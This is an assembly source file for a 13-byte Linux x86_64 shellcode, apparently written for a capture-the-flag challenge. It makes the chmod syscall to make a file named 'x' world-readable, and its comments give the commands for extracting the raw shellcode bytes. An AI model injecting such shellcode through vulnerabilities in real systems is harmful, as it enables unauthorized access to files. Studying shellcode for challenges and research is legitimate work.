#
# chmod.s - 13-bytes Linux/x86_64 chmod 004 shellcode 
# Copyright (c) 2025 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# Simple shellcode inspired by a challenge that shall remain unnamed to 
# prevent spoilers.
#
# Useful commands:
# $ gcc -nostdlib -static shellcode.s -o shellcode-elf
# $ objdump -M intel -d shellcode-elf
# $ strace ./shellcode-elf # doesn't work with with self-modifying code
# $ objcopy --dump-section .text=shellcode-raw shellcode-elf
# $ xxd -p shellcode-raw | tr -d '\n' | sed 's/../\\x&/g'
#

.intel_syntax noprefix
.global _start

.text
_start:
    # chmod("x", 004)
    push 0x78
    mov rdi, rsp        # "x"
    push 4
    pop rsi             # 0004
    push 0x5a           # chmod
    pop rax
    syscall
